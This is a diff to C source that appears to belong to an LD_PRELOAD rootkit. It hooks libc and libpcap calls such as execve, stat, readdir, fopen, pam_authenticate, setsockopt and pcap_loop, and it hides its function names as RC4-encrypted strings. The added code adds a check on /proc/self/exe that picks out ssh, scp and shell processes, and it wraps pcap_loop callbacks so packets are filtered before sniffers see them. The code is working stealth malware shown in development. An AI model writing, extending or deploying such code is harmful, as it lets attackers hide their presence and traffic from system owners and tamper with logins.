@@ -30,6 +30,7 @@ statx_fn orig_statx_6467;
 fstatat64_fn orig_fstatat_6436;
 readdir_fn orig_readdir_6135;
 readdir64_fn orig_readdir64_6171;
+pcap_handler orig_loop;
 
 #define FSTATAT_ENC "\x31\xA5\x8E\x54\xE1\x4D\x93"
 
@@ -130,8 +131,8 @@ int pam_authenticate(pam_handle_t *pamh, int flags) {
 #define LD_TRACE_ENC "\x1B\x92\xA5\x61\xC7\x6D\xA4\xF3\x9A\x03\x69\xD2" \
                      "\x57\x10\x2C\x30\xF9\x77\xB0\x91\x4B\x77\x08"
 
-int execve(const char *pathname, char *const _Nullable argv[],
-           char *const _Nullable envp[]) {
+int execve(const char *pathname, char *const argv[],
+           char *const envp[]) {
   char execve_str[7];
   char ld_trace[24];
 
@@ -193,7 +194,45 @@ int stat(const char *restrict pathname,
   return orig_stat_6491(pathname, statbuf);
 }
 
+#define PROC_SELF_EXE_ENC "\x78\xA6\x88\x5A\xF6\x03\x94\xD3\xA9\x29\x09\xF6\x6B\x30"
+#define SSH_ENC "\x78\xA5\x89\x5D"
+#define SCP_ENC "\x78\xA5\x99\x45"
+#define SH_ENC "\x24\xBE"
+
+uint32_t check_rw_hook(void) {
+  char buf[4096];
+  char proc_self_exe[15];
+  char ssh[5];
+  char scp[5];
+  char sh[3];
+  ssize_t size;
+
+  // "/proc/self/exe"
+  strcpy(proc_self_exe, PROC_SELF_EXE_ENC);
+  size = readlink(rc4(key, proc_self_exe, 14), buf, 4095);
+  buf[size] = '\0';
+  if (size < 0)
+    return 1;
+
+  // "/ssh"
+  strcpy(ssh, SSH_ENC);
+  if (endswith(buf, size, rc4(key, ssh, 4), 4))
+    return 2;
+  // "/scp"
+  strcpy(scp, SCP_ENC);
+  if (endswith(buf, size, rc4(key, scp, 4), 4))
+    return 2;
+  // "sh"
+  strcpy(sh, SH_ENC);
+  if (endswith(buf, size, rc4(key, sh, 2), 2))
+    return 3;
+
+  return 1;
+}
+
 #define READ_ENC "\x25\xB3\x9B\x51"
+
+extern uint32_t enable_hook_5776;
 
 ssize_t read(int fd, void *buf, size_t count) {
   char read_str[5];
@@ -222,6 +261,8 @@ ssize_t read(int fd, void *buf, size_t count) {
 
 #define PCAP_STATS_ENC "\x27\xB5\x9B\x45\xCA\x5F\x93\xD7\xB1\x3C"
 
+extern int filter_cnt;
+
 int pcap_stats(pcap_t *p, struct pcap_stat *ps) {
   char pcap_stats_str[11];
   pcap_stats_fn orig_pcap_stats;
@@ -245,9 +286,9 @@ int setsockopt(int socket, int level, int option_name,
                 option_value, option_len);
   if (res >= 0) {
     if (option_name == SO_ATTACH_FILTER
-        && apply_filter (socket, level, SO_ATTACH_FILTER,
-                         option_value, option_len,
-                         *(unsigned int *)option_value + 40)) {
+        && apply_filter(socket, level, SO_ATTACH_FILTER,
+                        option_value, option_len,
+                        *(unsigned int *)option_value + 40)) {
       syscall(SYS_setsockopt, socket, level, SO_ATTACH_FILTER,
               option_value, option_len);
     }
@@ -258,7 +299,6 @@ int setsockopt(int socket, int level, int option_name,
 }
 
 #define FOPEN_ENC "\x31\xB9\x8A\x50\xFB"
-#define UNK_ENC ""
 
 FILE *fopen(const char *restrict pathname,
             const char *restrict mode) {
@@ -435,7 +475,6 @@ int fstatat64(int dirfd, const char *pathname, struct stat64 *statbuf,
   return -1;
 }
 
-void *orig_loop;
 #define PCAP_LOOP_FN "\x27\xB5\x9B\x45\xCA\x40\x88\xD9\xB5"
 
 int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) {
@@ -446,7 +485,7 @@ int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) {
   strcpy(pcap_loop_str, PCAP_LOOP_FN);
   original = dlsym(RTLD_NEXT, rc4(key, pcap_loop_str, 9));
   orig_loop = (void *)callback;
-  return original(p, cnt, check_pkt, user);
+  return original(p, cnt, (pcap_handler)check_pkt, user);
 }
 
 #define READDIR_ENC "\x25\xB3\x9B\x51\xF1\x45\x95"
